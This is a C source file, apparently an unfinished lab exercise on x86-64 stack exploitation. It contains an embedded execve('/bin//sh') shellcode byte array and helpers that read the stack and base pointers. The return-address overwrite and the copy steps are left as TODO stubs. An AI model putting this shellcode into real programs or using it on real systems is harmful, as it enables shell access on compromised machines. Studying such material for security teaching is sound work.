#include <stdio.h>

typedef unsigned long long int uInt_64; 

#define PRINT_DEBUG 0
#define OFFSET_RET 1
#define OFFSET_SHELLCODE 0x1000
#define BUFFER_NOP 7
#define NOP 0x90

inline uInt_64 getsp(void) __attribute__((always_inline));
inline uInt_64 getbp(void) __attribute__((always_inline));

int main(int argc, char** argv) 
{
	uInt_64 *sp = (uInt_64 *) getsp();
	uInt_64 *bp = (uInt_64 *) getbp();
	char *new_ptr_shellcode = (char *) sp - OFFSET_SHELLCODE;	
	char shellcode[] = {
		"\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53"
		"\x48\x31\xd2\x048\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"
		};

	/* replace return address by new address of shellcode */
	//TODO

	/* copy shellcode and nop instructions far away on stack */
	//TODO

	#if PRINT_DEBUG
	printf("SP : 0x%llX\n", (uInt_64) sp);
	printf("BP : 0x%llX\n", (uInt_64) bp);
	printf("[SP BP] : %llu\n", (uInt_64) bp - (uInt_64) sp);	
	printf("ptr return to startup : 0x%llX\n",  (uInt_64) (bp+OFFSET_RET));
	printf("ptr shellcode : 0x%llX\n", (uInt_64) shellcode);
	printf("new ptr shellcode : 0x%llX\n\n",  (uInt_64) *(bp+OFFSET_RET));
	#endif

	printf("Hi shell ...\n");
  	return 0;
}

inline uInt_64 getsp(void) {
  __asm__("mov    %rsp,%rdx");
}

inline uInt_64 getbp(void) {
  __asm__("mov    %rbp,%rax");
}

